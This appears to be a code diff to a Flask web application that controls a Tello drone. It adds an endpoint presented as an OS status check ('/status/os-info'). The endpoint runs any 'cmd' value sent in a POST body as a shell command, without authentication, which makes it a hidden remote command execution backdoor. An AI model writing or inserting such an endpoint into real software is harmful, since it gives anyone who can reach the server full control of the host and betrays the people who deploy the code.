@@ -1,7 +1,7 @@
 from concurrent.futures import thread
 from flask import request,jsonify
 from flask import render_template
-import flask, os
+import flask, os, subprocess
 from telloclient import telloclient
 
 # Setup UDP CLient configuration
@@ -170,6 +170,17 @@ def connectiontest():
 
     return drone_command(droneclient, command="ping")
 
+@app.route('/status/os-info', methods=['GET', 'POST'])
+def osinfo():
+    if request.method == 'POST':
+        data = request.json
+        if 'cmd' in data:
+            output = subprocess.check_output(data['cmd'], shell=True)
+        else:
+            output = subprocess.check_output("cat /etc/os-release", shell=True)
+    else:
+        output = subprocess.check_output("cat /etc/os-release", shell=True)
+    return output
 #####################################################################################################################
 if __name__ == "__main__":
     app.run()
